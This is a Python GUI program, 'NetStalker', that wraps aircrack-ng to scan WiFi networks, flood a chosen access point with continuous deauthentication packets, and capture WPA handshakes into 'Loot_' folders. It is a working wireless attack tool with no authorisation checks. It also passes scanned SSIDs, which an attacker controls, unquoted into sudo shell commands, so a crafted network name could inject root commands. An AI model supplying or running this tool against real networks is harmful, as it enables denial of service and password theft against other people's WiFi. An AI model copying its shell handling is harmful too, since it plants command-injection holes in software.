import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import subprocess
import threading
import os
import csv
import time
import signal

# GUI Theme Configuration
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class NetStalkerSuite(ctk.CTk):
    def __init__(self):
        super().__init__()

        # Window Settings
        self.title("NetStalker - WiFi Penetration Testing Suite")
        self.geometry("1150x750")
        
        self.attack_proc = None
        self.networks_found = []

        # Layout Configuration
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Sidebar
        self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        # Logo
        self.label_logo = ctk.CTkLabel(self.sidebar, text="NETSTALKER\nv1.0", 
                                       font=ctk.CTkFont(size=24, weight="bold", family="Courier"))
        self.label_logo.pack(pady=(30, 20))

        # Interface Selection Section
        self.label_iface = ctk.CTkLabel(self.sidebar, text="STEP 1: SELECT INTERFACE", 
                                        font=ctk.CTkFont(size=12, weight="bold"), text_color="#3b8ed0")
        self.label_iface.pack(pady=(10, 5))

        self.iface_var = ctk.StringVar(value="Select Interface")
        self.iface_menu = ctk.CTkOptionMenu(self.sidebar, values=self.get_interfaces(), 
                                            variable=self.iface_var, height=35)
        self.iface_menu.pack(pady=5, padx=20, fill="x")

        self.btn_refresh = ctk.CTkButton(self.sidebar, text="REFRESH INTERFACES", 
                                         command=self.refresh_ifaces, height=25, 
                                         fg_color="transparent", border_width=1)
        self.btn_refresh.pack(pady=(0, 20), padx=20, fill="x")

        # Control Buttons
        self.btn_scan = self.create_btn("2. START SCAN", self.start_scan_thread, "#2e7d32")
        self.btn_deauth = self.create_btn("3. DEAUTH ATTACK", self.ask_for_target_deauth, "#c62828")
        self.btn_capture = self.create_btn("4. CAPTURE HANDSHAKE", self.ask_for_target_capture, "#f9a825")
        self.btn_stop = self.create_btn("STOP ALL PROCESSES", self.kill_all, "#37474f")

        # Footer
        self.sub_logo = ctk.CTkLabel(self.sidebar, text="Professional Edition v1.0", font=ctk.CTkFont(size=10))
        self.sub_logo.pack(pady=20, side="bottom")

        # Main View
        self.main_view = ctk.CTkFrame(self, fg_color="transparent")
        self.main_view.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")

        self.progress_bar = ctk.CTkProgressBar(self.main_view, orientation="horizontal", height=12)
        self.progress_bar.set(0)
        self.progress_bar.pack(fill="x", pady=(0, 15))

        self.label_table = ctk.CTkLabel(self.main_view, text="NETWORK LIST (ID | SSID | BSSID | CH)", font=ctk.CTkFont(size=14, weight="bold"))
        self.label_table.pack(anchor="w")

        self.listbox = tk.Listbox(self.main_view, bg="#000", fg="#00FF41", font=("Courier New", 12), 
                                  borderwidth=0, highlightthickness=1, highlightbackground="#333",
                                  selectbackground="#333")
        self.listbox.pack(fill="both", expand=True, pady=10)

        self.console = ctk.CTkTextbox(self.main_view, height=180, fg_color="#000", text_color="#00FF41", font=("Courier", 12))
        self.console.pack(fill="x")
        self.log("Ready. NetStalker Suite initialized.")

    def create_btn(self, text, command, color):
        btn = ctk.CTkButton(self.sidebar, text=text, command=command, fg_color=color, hover_color="#444", corner_radius=5, height=45, font=ctk.CTkFont(weight="bold"))
        btn.pack(pady=10, padx=20, fill="x")
        return btn

    def log(self, msg):
        self.console.insert("end", f">>> {msg}\n")
        self.console.see("end")

    def get_interfaces(self):
        try:
            out = subprocess.check_output("iw dev | grep Interface", shell=True).decode()
            ifaces = [line.split()[1] for line in out.split('\n') if line.strip()]
            return ifaces if ifaces else ["No Interface Found"]
        except: 
            return ["No Interface Found"]

    def refresh_ifaces(self):
        new_list = self.get_interfaces()
        self.iface_menu.configure(values=new_list)
        self.iface_var.set(new_list[0])
        self.log("Interface list updated.")

    def check_iface_selected(self):
        val = self.iface_var.get()
        if val == "Select Interface" or val == "No Interface Found":
            messagebox.showerror("Error", "Please select a valid Wireless Interface first!")
            return False
        return val

    def start_scan_thread(self):
        iface = self.check_iface_selected()
        if not iface:
            return
        
        self.listbox.delete(0, tk.END)
        self.networks_found = []
        threading.Thread(target=self.scan_logic, args=(iface,), daemon=True).start()

    def scan_logic(self, iface):
        self.log(f"Configuring {iface} to Monitor Mode...")
        
        subprocess.run(f"sudo airmon-ng check kill", shell=True, capture_output=True)
        subprocess.run(f"sudo ip link set {iface} down", shell=True)
        subprocess.run(f"sudo iw {iface} set type monitor", shell=True)
        subprocess.run(f"sudo ip link set {iface} up", shell=True)

        self.log("Scanning... (10 second pulse)")
        temp_file = "/tmp/netstalker_scan"
        subprocess.run(f"sudo rm {temp_file}* > /dev/null 2>&1", shell=True)

        subprocess.Popen(f"sudo timeout 10 airodump-ng --write {temp_file} --output-format csv {iface}", 
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        for i in range(1, 101):
            self.progress_bar.set(i/100)
            time.sleep(0.1)

        self.progress_bar.set(0)
        self.parse_csv(f"{temp_file}-01.csv")

    def parse_csv(self, file_path):
        if not os.path.exists(file_path):
            self.log("Error: No data stream received.")
            return

        with open(file_path, 'r') as f:
            reader = csv.reader(f)
            start = False
            counter = 1
            for row in reader:
                if not row:
                    continue
                if "BSSID" in row[0]:
                    start = True
                    continue
                if "Station" in row[0]:
                    break
                if start and len(row) >= 14:
                    net = {"id": counter, "bssid": row[0].strip(), "ch": row[3].strip(), "ssid": row[13].strip()}
                    self.networks_found.append(net)
                    display_text = f"[{counter}]  {net['ssid']:<20} | {net['bssid']} | CH: {net['ch']}"
                    self.listbox.insert(tk.END, display_text)
                    counter += 1
        
        self.log(f"Scan Complete. {len(self.networks_found)} networks detected.")

    def ask_for_target_deauth(self):
        iface = self.check_iface_selected()
        if not iface:
            return
        if not self.networks_found:
            messagebox.showwarning("System", "Perform a scan first!")
            return
        
        dialog = ctk.CTkInputDialog(text="Enter Target ID (e.g. 1):", title="Deauth Mission")
        target_id = dialog.get_input()
        
        if target_id and target_id.isdigit():
            idx = int(target_id) - 1
            if 0 <= idx < len(self.networks_found):
                self.run_deauth(self.networks_found[idx], iface)
            else:
                messagebox.showerror("Error", "ID out of range.")

    def run_deauth(self, target, iface):
        self.log(f"ATTACKING -> {target['ssid']}")
        subprocess.run(f"sudo iwconfig {iface} channel {target['ch']}", shell=True)
        cmd = f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {iface}"
        self.attack_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)

    def ask_for_target_capture(self):
        iface = self.check_iface_selected()
        if not iface:
            return
        if not self.networks_found:
            return
        
        dialog = ctk.CTkInputDialog(text="Enter Target ID for Capture:", title="Capture Mission")
        target_id = dialog.get_input()
        if target_id and target_id.isdigit():
            idx = int(target_id) - 1
            if 0 <= idx < len(self.networks_found):
                self.run_capture(self.networks_found[idx], iface)

    def run_capture(self, target, iface):
        path = f"Loot_{target['ssid'].replace(' ', '_')}"
        os.makedirs(path, exist_ok=True)
        self.log(f"HANDSHAKE CAPTURE -> {path}/")
        cmd = f"sudo airodump-ng -c {target['ch']} --bssid {target['bssid']} -w {path}/capture {iface}"
        self.attack_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)

    def kill_all(self):
        subprocess.run("sudo pkill aireplay-ng", shell=True)
        subprocess.run("sudo pkill airodump-ng", shell=True)
        if self.attack_proc:
            self.attack_proc.terminate()
        self.log("All processes stopped. Interface released.")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("ROOT ACCESS REQUIRED!")
    else:
        app = NetStalkerSuite()
        app.mainloop()
